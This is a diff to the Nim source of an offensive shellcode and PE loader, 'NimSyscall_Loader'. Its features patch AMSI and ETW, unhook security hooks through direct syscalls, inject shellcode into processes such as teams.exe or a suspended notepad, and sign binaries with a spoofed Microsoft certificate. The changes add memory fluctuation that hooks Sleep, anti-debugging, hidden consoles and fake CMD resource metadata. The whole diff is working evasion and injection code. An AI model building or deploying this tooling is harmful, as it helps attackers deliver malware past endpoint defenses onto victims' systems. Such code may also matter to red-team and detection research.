@@ -58,7 +58,8 @@ let helpmenu = """
 NimSyscall_Loader v 1.5
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --arguments=<hardcodedArgs> --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86 --llvm --sign --signdomain=<exampledomain> --sleepycrypt]
+
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -72,16 +73,19 @@ Options:
   --key key     Key to encrypt with
   --output filename    Filename for encrypted exe/dll
   --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
+  --noRES    Don't set custom resource file information (cmd icon, CMD description by default)
   --dll     Generate DLL instead of an exe
   --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions
   --noETW    Don't use ETW Patch
   --noAMSI    Don't patch AMSI
   --noArgs    Don't provide any arguments to the assembly (some can only run without args)
   --hide    Compile with --app:gui flag, so that the console won't pop up
+  --APIhide    Console won't pop up, hidden via API calls 'GetConsoleWindow' and 'ShowWindow' with 'SW_HIDE'
   --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
   --debug    Compiles the binary in debug mode (More DInvoke output)
   --x86    (Compiles an x86 binary - have to cast some more function values before this works smoothly)
   --large    use this for large payloads (bigger than 5MB) as you will get an error "interpretation requires too many iterations" without it
+  --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
 
 [evasion]
 
@@ -106,6 +110,9 @@ Options:
       --signdomain www.example.com    The domain to use for the certificate (default is www.microsoft.com)
   --llvm    Add compiler flags for LLVM obfuscation, you have to set it up by yourself
   --sleepycrypt    Encrypt the memory of the loader with SleepyCrypt # experimental (Pre-Alpha, not working yet for C2-Stager)
+  --fluctuate    Enable ShellcodeFluctuation for local shellcode injection and PE-Loading (Alpha) - no support for remote injection
+                 This will only work for C2-Payloads, that use Win32 Sleep in between connection attempts, as that is hooked
+  --antidebug    Checks the BeingDebugged flag of the current process and if it is set, it will quit
 
 [Syscall retrival technique to use, default is GetSyscallStub to retrievethe stubs from disk]
 
@@ -117,10 +124,11 @@ Options:
 
   --shellcode    Encrypt shellcode to load it on runtime
   --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
-  --remoteprocess procname    Injects into the specified remote process name, e.g. teams.exe. The loader searches for the first process with that name
-                     Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
-  --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
-  --remotepatchETW    Patch ETW in the remote process before shellcode execution
+      --customprocess procname    Spawn a custom process (instead of notepad) for remote injection
+      --remoteprocess procname    Injects into the specified (existing) remote process name, e.g. teams.exe. The loader searches for the first process with that name
+                         Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
+      --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
+      --remotepatchETW    Patch ETW in the remote process before shellcode execution
   
 [PE Packing]
 
@@ -152,6 +160,7 @@ var
     remoteprocesses : seq[string]
     targetdomain : string = ""
     processname: string = ""
+    customspawnprocess: string = "notepad.exe"
     sandboxcheckfmt: string = ""
     sandboxchecks: seq[string]
     sandbox: bool = false
@@ -170,6 +179,7 @@ var
     sleeptime: int = 0
     reflective: bool = false
     hide: bool = false
+    apiHide: bool = false
     noArgs: bool = false
     peinject: bool = false
     peload: bool = false
@@ -192,6 +202,10 @@ var
     compileX86: bool = false
     noassembly: bool = false
     sleepycrypt: bool = false
+    fluctuate: bool = false
+    noDInvoke: bool = false
+    noRES: bool = false
+    antidebug: bool = false
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 1.5")
 
@@ -249,12 +263,8 @@ if args["--output"]:
   let outname = args["--output"]
   outfile = fmt"{outname}"
 
-if args["--remoteprocess"]:
-  let remoteprocessesstring = args["--remoteprocess"]
-  processname = fmt"{remoteprocessesstring}"
-  echo processname
-  remoteprocesses = processname.split(',')
-  echo remoteprocesses
+if args["--noRES"]:
+  noRES = false
 
 if args["--remotepatchAMSI"]:
   remoteAMSIpatch = true
@@ -285,6 +295,17 @@ if args["--sleep"]:
 if args["--remoteinject"]:
   localinject = false
 
+if args["--customprocess"]:
+  let customprocargs = args["--customprocess"]
+  customspawnprocess = fmt"{customprocargs}"
+
+if args["--remoteprocess"]:
+  let remoteprocessesstring = args["--remoteprocess"]
+  processname = fmt"{remoteprocessesstring}"
+  echo processname
+  remoteprocesses = processname.split(',')
+  echo remoteprocesses
+
 if args["--reflective"]:
   reflective = true
 
@@ -304,8 +325,15 @@ if args["--llvm"]:
 if args["--sleepycrypt"]:
     sleepycrypt = true
 
+if args["--fluctuate"]:
+    fluctuate = true
+
 if args["--hide"]:
   hide = true
+
+if args["--APIhide"]:
+  apihide = true
+  hide = false
 
 if args["--noArgs"]:
   noArgs = true
@@ -356,8 +384,14 @@ if args["--obfuscatefunctions"]:
 if args["--debug"]:
   debugMode = true
 
+if args["--antidebug"]:
+  antidebug = true
+
 if args["--x86"]:
   compileX86 = true
+
+if args["--noDInvoke"]:
+  noDInvoke = true
 
 var blob: string
 
@@ -531,6 +565,7 @@ import osproc
 """
 
 let AssemblyImports = """
+import winim/clr
 from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
 """
 
@@ -543,6 +578,22 @@ when defined(lib_only):
     # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
     # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
     AttachConsole(-1)
+
+when defined(Fluctuate):
+    g_fluctuationData.shellcodeAddr = dectext[0].addr
+    g_fluctuationData.shellcodeSize = SIZE_T(dectext.len)
+    # Will change the hardcoded key later on
+    when defined(amd64):
+        g_fluctuationData.encodeKey = 0x1337DE4D
+    when defined(i386):
+        g_fluctuationData.encodeKey = 0x1337
+    g_fluctuationData.currentlyEncrypted = false
+    g_fluctuationData.protect = PAGE_READWRITE
+    g_fluctuate = FluctuateToRW
+    if (hookSleep()):
+        echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
+    else:
+        echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
 
 var cmd: seq[string]
 var i = 1
@@ -608,7 +659,11 @@ import base64
 import strutils
 import ptr_math
 import strenc
-import DInvoke
+when defined(Fluctuate):
+    import Fluctuation
+
+when defined(DInvoke):
+    import DInvoke
 
 var success: BOOL
 
@@ -863,7 +918,7 @@ proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bo
 """
 
 let DllCustomExportStub = """
-proc FUNC_EXPORT(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
+proc `FUNC_EXPORT`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
     NimMain()
     return true
 """
@@ -881,16 +936,68 @@ proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bo
 """
 
 let DllCustomExportStubRemoteInj = """
-proc FUNC_EXPORT(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
+proc `FUNC_EXPORT`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
     return true
+"""
+
+let APIHideStub = """
+
+#[ Crappy behaviours here , maybe I'll fix it later ]
+when defined(DInvoke):
+    const
+      USER32_DLL* = obf("user32.dll")
+
+    type
+      GetConsoleWindow_t* = proc (): HANDLE {.stdcall.}
+      ShowWindow_t* = proc (hwnd: HANDLE, nCmdShow: int): BOOL {.stdcall.}
+  
+    const
+      GetConsoleWindow_OBF * = obf("GetConsoleWindow")
+      ShowWindow_OBF * = obf("ShowWindow")
+  
+    var MyGetConsoleWindow*: GetConsoleWindow_t
+    var MyShowWindow*: ShowWindow_t
+
+    MyGetConsoleWindow = cast[GetConsoleWindow_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetConsoleWindow_OBF, 0, FALSE)))
+
+    MyShowWindow = cast[ShowWindow_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(USER32_DLL, TRUE)), ShowWindow_OBF, 0, FALSE)))
+
+
+    var hwnd: HANDLE = MyGetConsoleWindow()
+    var hidden: bool = MyShowWindow(hwnd, SW_HIDE)
+    echo "Hidden:", hidden
+
+else:]#
+var hwnd: HANDLE
+hwnd = GetConsoleWindow()
+ShowWindow(hwnd, SW_HIDE)
 """
 
 let SleepyCryptLoopExecute = """
 SleepyCryptLoop(10000)
 """
 
+let NotepadProcIDStub * = fmt"""
+
+# Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
+let tProcess = startProcess(obf("{customspawnprocess}"))
+tProcess.suspend() # That's handy!
+tProcess.close()
+
+echo obf("[*] Target Process: "), tProcess.processID
+var remoteProcID = DWORD(tProcess.processID)
+
+"""
+
+let BeingDebugged * = fmt"""
+import AntiDebug
+if(AmIDebugged()):
+  quit()
+"""
+
 var stub = Cryptstub1
-stub.add(DInvokeBaseStub)
+if (not noDInvoke):
+    stub.add(DInvokeBaseStub)
 
 if(pump):
     # makes no sense to import strenc when strings should be visible in the binary.
@@ -903,8 +1010,11 @@ if(pump):
             echo "[*] Adding reputation"
             stub.add(genTrustedwords(rand(3500..6200)))
 
+if(antidebug):
+    stub.add(BeingDebugged)
+
 if(sandbox):
-    stub.add(DInvokeSandBoxStub)
+    if (not noDInvoke): stub.add(DInvokeSandBoxStub)
     for m in sandboxchecks:
         if(m == "Domain"):
             stub.add(DomainCheckStub)
@@ -915,6 +1025,9 @@ if(sandbox):
             stub.add(DomainJoinStub)
         if (m == "MemorySpace"):
             stub.add(MemorySpaceStub)
+
+if (apihide):
+    stub.add(APIHideStub)
 
 if(gosleep):
     stub.add(SleepStubFirst)
@@ -933,7 +1046,7 @@ if (syswhispers):
 
 if(unhook):
     if(hellsgate):
-        stub.add(DInvokeUnhookStubs)
+        if (not noDInvoke): stub.add(DInvokeUnhookStubs)
         stub.add(Winimleanstub)
         stub.add(WinLeanGetCurrentProcStub)
         stub.add(HellsgateStub)
@@ -942,7 +1055,7 @@ if(unhook):
         stub.add(HellsgateNtCloseDelegate)
         stub.add(HellsgateUnhookStub)
     elif(getfreshstub):
-        stub.add(DInvokeUnhookStubs)
+        if (not noDInvoke): stub.add(DInvokeUnhookStubs)
         stub.add(Winimleanstub)
         stub.add(NtProtectVirtualMemoryDelegate)
         stub.add(NtWriteVirtualMemoryDelegate)
@@ -950,7 +1063,7 @@ if(unhook):
         stub.add(UnhookSyscalls)
         stub.add(UnhookStub)
     elif(syswhispers):
-        stub.add(DInvokeUnhookStubs)
+        if (not noDInvoke): stub.add(DInvokeUnhookStubs)
         stub.add(Winimleanstub)
         stub.add(WhispersUnhookStub)
 else:
@@ -969,9 +1082,9 @@ stub.add(Cryptstub2)
 stub.add(Cryptstub3)
 
 if (AMSI or ETW or peload or (localinject == false) or selfdelete):
-    stub.add(DInvokeLoadLibraryAGetProcAddress)
+    if (not noDInvoke): stub.add(DInvokeLoadLibraryAGetProcAddress)
     if (selfdelete):
-        stub.add(DInvokeSelfDeleteStubs)
+        if (not noDInvoke): stub.add(DInvokeSelfDeleteStubs)
         stub.add(FileDeleteStub)
 
 if (localinject):
@@ -998,7 +1111,7 @@ if (remoteETWpatch or remoteAMSIpatch):
     if (gosleep == false):
         stub.add(SleepStubFirst)
     if (unhook == false):
-        stub.add(DInvokeGetModuleHandleADelegate)
+        if (not noDInvoke): stub.add(DInvokeGetModuleHandleADelegate)
 
 if(dll_out):
     if (processname == ""):
@@ -1036,7 +1149,7 @@ if (peload):
             stub.add(HellsgateAllocDelegate)
             stub.add(HellsgateNtCreateThreadExDelegate)
             if (processname == ""):
-                stub.add(HellsgateNotepadProcIDStub)
+                stub.add(NotepadProcIDStub)
                 if (remoteETWpatch):
                     stub.add(HellsgateRemotePatchETWStub)
                 if (remoteAMSIpatch):
@@ -1073,7 +1186,7 @@ if (shellcode):
             stub.add(HellsgateAllocDelegate)
             stub.add(HellsgateNtCreateThreadExDelegate)
             if (processname == ""):
-                stub.add(HellsgateNotepadProcIDStub)
+                stub.add(NotepadProcIDStub)
                 if (remoteETWpatch):
                     stub.add(HellsgateRemotePatchETWStub)
                 if (remoteAMSIpatch):
@@ -1092,7 +1205,7 @@ if (shellcode):
                 stub.add(HellsShellcoderemoteinjectStub)
         elif(syswhispers):
             if (processname == ""):
-                stub.add(WhispersNotepadProcIDStub)
+                stub.add(NotepadProcIDStub)
                 if (remoteETWpatch):
                     stub.add(WhispersRemotePatchETWStub)
                 if (remoteAMSIpatch):
@@ -1149,8 +1262,8 @@ if (pump):
             stub.add(genEnglishwords(rand(4750..7800)))
 
 if (sleepycrypt):
-    stub.add(SleepyCryptTestStub)
-    stub.add(SleepyCryptLoopExecute)
+    stub.add(LocalInjectGetSyscallStubSleepStub)
+    #stub.add(SleepyCryptLoopExecute)
 
 if (debugMode):
     stub = stub.replace("import strenc", "")
@@ -1218,8 +1331,26 @@ if embeddedArguments:
 if (big):
     basicCompileFlags.add("--maxLoopIterationsVM:1000000000 ")
 
+if (not noRES):
+    if (dll_out):
+        when system.hostOS == "windows":
+            basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\dll.o ")
+        else:
+            basicCompileFlags.add(fmt"--passL:{packerPath}/resource/dll.o ")    
+    else:
+        when system.hostOS == "windows":
+            basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\cmd.o ")
+        else:
+            basicCompileFlags.add(fmt"--passL:{packerPath}/resource/cmd.o ")
+
+if(fluctuate):
+    basicCompileFlags.add(fmt"-d:Fluctuate ")
+
 if (compileX86):
     basicCompileFlags.add("--cpu:i386 ")
+
+if not noDInvoke:
+    basicCompileFlags.add("-d:DInvoke ")
 
 if (dll_out):
     if (processname == ""):
